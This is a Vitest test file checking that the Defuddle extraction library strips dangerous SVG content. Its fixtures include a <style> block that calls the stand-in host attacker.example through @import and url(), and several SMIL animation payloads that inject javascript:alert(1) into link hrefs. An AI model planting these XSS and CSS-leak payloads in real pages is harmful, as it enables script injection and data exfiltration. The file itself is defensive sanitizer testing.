import { describe, test, expect } from 'vitest';
import { Defuddle } from '../src/node';
import { parseDocument } from './helpers';

describe('SVG sanitization', () => {
	test('strips <style> inside SVG to prevent CSS-based external fetches', async () => {
		const html = `<!DOCTYPE html>
<html>
<head><title>SVG style leak</title></head>
<body>
<article>
<h1>SVG style leak</h1>
<p>Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua ut enim ad minim veniam quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
<svg viewBox="0 0 200 200" width="200" height="200">
<style>@import url("http://attacker.example/leak.css"); .x { fill: url("http://attacker.example/img.png"); }</style>
<circle class="x" cx="100" cy="100" r="80"/>
</svg>
<p>More content paragraph two that helps ensure the article scoring picks the right element so the SVG is preserved within the chosen content element for inspection here.</p>
<p>Third paragraph just adding more content to make this look like a real article worth extracting from the page properly without removal.</p>
</article>
</body>
</html>`;

		const result = await Defuddle(
			parseDocument(html, 'https://example.com/svg-style'),
			'https://example.com/svg-style'
		);

		expect(result.content).not.toContain('@import');
		expect(result.content).not.toContain('attacker.example');
		expect(result.content).not.toMatch(/<style\b/i);
	});

	const SMIL_PAYLOADS: Array<[string, string]> = [
		['animate href', '<svg><a><animate attributeName="href" values="javascript:alert(1)" dur="1s" fill="freeze">x</animate><text>click</text></a></svg>'],
		['animate xlink:href', '<svg><a><animate attributeName="xlink:href" values="javascript:alert(1)" dur="1s" fill="freeze">x</animate><text>click</text></a></svg>'],
		['set href', '<svg><a><set attributeName="href" to="javascript:alert(1)">x</set><text>click</text></a></svg>'],
		['animateTransform', '<svg><a><animateTransform attributeName="transform" values="javascript:alert(1)" dur="1s">x</animateTransform><text>click</text></a></svg>'],
		['animateMotion', '<svg><a><animateMotion values="javascript:alert(1)" dur="1s">x</animateMotion><text>click</text></a></svg>']
	];

	const PARA = '<p>Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua ut enim ad minim veniam quis nostrud exercitation.</p>';

	for (const [name, payload] of SMIL_PAYLOADS) {
		test(`strips SMIL animation from article content: ${name}`, async () => {
			const html = `<!DOCTYPE html><html><head><title>SMIL</title></head>
<body><article><h1>SMIL</h1>${PARA}${payload}${PARA}</article></body></html>`;

			const result = await Defuddle(
				parseDocument(html, 'https://example.com/smil'),
				'https://example.com/smil'
			);

			expect(result.content).not.toMatch(/javascript:/i);
			expect(result.content).not.toMatch(/<animate|<set\b/i);
		});

		test(`strips SMIL animation from schema.org text fallback: ${name}`, async () => {
			const articleBody = `${payload} one two three four five six seven eight nine ten eleven twelve`;
			const html = `<!DOCTYPE html><html><head><title>SMIL</title>
<script type="application/ld+json">${JSON.stringify({
				'@context': 'https://schema.org',
				'@type': 'Article',
				headline: 'SMIL',
				articleBody
			})}</script></head>
<body><main><p>hi</p></main></body></html>`;

			const result = await Defuddle(
				parseDocument(html, 'https://example.com/smil-schema'),
				'https://example.com/smil-schema'
			);

			expect(result.content).not.toMatch(/javascript:/i);
			expect(result.content).not.toMatch(/<animate|<set\b/i);
		});
	}

	test('removes mask attribute when mask content has no inline fill or stroke', async () => {
		const html = `<!DOCTYPE html><html><head><title>SVG mask</title></head>
<body><article><h1>SVG mask</h1>${PARA}
<svg viewBox="0 0 720 472" width="720" height="472" role="img" aria-label="Chart">
  <defs>
    <mask id="tf-curve" maskUnits="userSpaceOnUse" x="0" y="0" width="720" height="472">
      <path class="reveal" d="M170,110 C535,110 600,143 600,330" pathLength="1" />
    </mask>
    <mask id="styled-mask" maskUnits="userSpaceOnUse" x="0" y="0" width="720" height="472">
      <rect x="0" y="0" width="720" height="472" fill="white" />
    </mask>
  </defs>
  <path class="hoped" d="M170,110 C535,110 600,143 600,330" mask="url(#tf-curve)" />
  <rect x="0" y="0" width="10" height="10" fill="red" mask="url(#styled-mask)" />
</svg>
${PARA}</article></body></html>`;

		const result = await Defuddle(
			parseDocument(html, 'https://example.com/svg-mask'),
			'https://example.com/svg-mask'
		);

		expect(result.content).not.toContain('mask="url(#tf-curve)"');
		expect(result.content).toContain('mask="url(#styled-mask)"');
	});
});
